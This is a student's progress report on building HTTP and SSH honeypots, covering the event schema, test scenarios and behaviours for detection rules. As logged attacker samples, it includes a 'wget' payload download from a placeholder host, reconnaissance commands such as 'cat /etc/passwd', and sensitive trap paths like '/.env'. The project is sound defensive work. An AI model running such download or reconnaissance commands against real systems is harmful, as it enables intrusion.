# Honeypot Engineering: progress report

Author: Nour | Date: 2026-10-15 | Branch: `feature/ssh-honeypot`

## Summary

| Component | Status |
|---|---|
| Repository structure, shared `Event` model, JSONL emitter | Done |
| HTTP honeypot v1 (trap paths, fake WordPress login, scanner detection) | Done, tested manually |
| SSH honeypot v1 (asyncssh server + fake shell + fake filesystem) | Done, tested manually |
| Automated tests | 9 passing (1 event model, 3 SSH server, 5 fake shell) |
| Scenarios | `http_scan.py`, `ssh_scenario.py` (bruteforce and session) |
| Docker | HTTP service only; SSH service not added yet |
| API honeypot | Not started |

## How to run it (Windows, PowerShell)

```powershell
git switch feature/ssh-honeypot
py -3 -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
python -m pytest

# terminal 1
python -m honeypots.ssh_hp.server      # or: python -m honeypots.http_hp.server

# terminal 2 (activate the venv too)
python scenarios\ssh_scenario.py session
python scenarios\http_scan.py
Get-Content data\events.jsonl -Tail 12
```

You can also connect with the real client (any password): `ssh root@localhost -p 2222`.

## Events produced (contract for backend and threat intel)

One JSON object per line in `data/events.jsonl`. Common fields: `event_id`, `timestamp` (UTC), `service`, `event_type`, `source_ip`, `source_port`, `session_id`, `details`. See `docs/event-schema.md`.

| service | event_type | fields in `details` |
|---|---|---|
| http | `http_request` | `method`, `path`, `user_agent`, `headers`, `body`, `trap_hit`, `scanner_ua` (login POST adds `username`, `password`) |
| ssh | `connect` | connection start |
| ssh | `auth_attempt` | `username`, `password`, `success`, `attempt_no`, `client_version` |
| ssh | `command` | `command`, `cwd`, `mode` |
| ssh | `file_download_attempt` | `tool`, `url`, `command` |
| ssh | `disconnect` | `duration_s`, `error` |

Real examples from my tests (shortened):

```json
{"service":"ssh","event_type":"auth_attempt","source_ip":"127.0.0.1","session_id":"75f87f3d00a7",
 "details":{"username":"root","password":"toor","success":true,"attempt_no":3,
            "client_version":"SSH-2.0-AsyncSSH_2.24.1"}}

{"service":"ssh","event_type":"file_download_attempt","session_id":"75f87f3d00a7",
 "details":{"tool":"wget","url":"http://example.com/payload.sh","command":"wget http://example.com/payload.sh"}}

{"service":"http","event_type":"http_request","session_id":"0aed53ef17e5",
 "details":{"method":"GET","path":"/xmlrpc.php","user_agent":"sqlmap/1.7 (lab-scenario)",
            "trap_hit":true,"scanner_ua":true}}
```

## What I observed

- **HTTP scan scenario:** 11 requests produced 11 events with the same `session_id`. Trap paths (`/wp-admin/`, `/phpmyadmin/`, `/.env`, `/.git/config`, `/xmlrpc.php`) are flagged with `trap_hit`, and the scanner-like user-agent is flagged with `scanner_ua`.
- **SSH:** the first two login attempts are refused and the third is accepted (`attempt_no` is recorded). The fake shell answers `whoami`, `id`, `uname -a`, `cat /etc/passwd`, `ls`, `ps` and `history` with canned output. Everything typed is logged as a `command` event.
- **Downloads:** `wget http://example.com/payload.sh` is not executed. The shell answers "unable to resolve host address" and only the URL is logged.
- The real OpenSSH client works against the honeypot.

## Behaviours available for detection rules (for the threat intel part)

- repeated failed SSH logins from the same source (`auth_attempt`, `success: false`, rising `attempt_no`)
- web scanning: many distinct paths in a short time, trap paths hit, scanner user-agents
- reconnaissance commands after login (`whoami`, `id`, `uname`, `cat /etc/passwd`, `ps`)
- download attempts (`file_download_attempt` with a URL)
- one source touching several services

## Known limitations and things to fix

- HTTP events have `source_port: null`; I will add the client port.
- Servers listen on `0.0.0.0` in development; to restrict to `127.0.0.1` locally and to the Docker network later.
- The HTTP honeypot still has its own copy of `protect_secret`; to replace it with `honeypots/common/secrets.py`.
- Passwords are stored in clear only in the isolated lab (`HP_CAPTURE_PASSWORDS`); a hash is stored otherwise.
- The SSH service is not in Docker yet, so the network isolation test for SSH is still to do.
- Isolation checks still to document in `docs/security-model.md`: no outbound connection from the containers, nothing created on the host by fake shell commands.

## Next steps

1. Add the SSH section to `docs/honeypots.md`.
2. Add the SSH honeypot to `docker-compose.yml` and run the isolation tests.
3. Build the API honeypot (decoy routes, token and request logging).
4. Add scenarios for the API honeypot and for a multi-service session.

## What I need from the team

- **Backend (Student 2):** confirm that the JSONL file is a good input, or tell me if you prefer that honeypots send events by HTTP to your collector. Confirm the common fields.
- **Threat intel (Student 3):** run the scenarios on your side to test your rules, and tell me which extra fields you need in `details`.
- **Everyone:** review the pull request for `feature/ssh-honeypot`.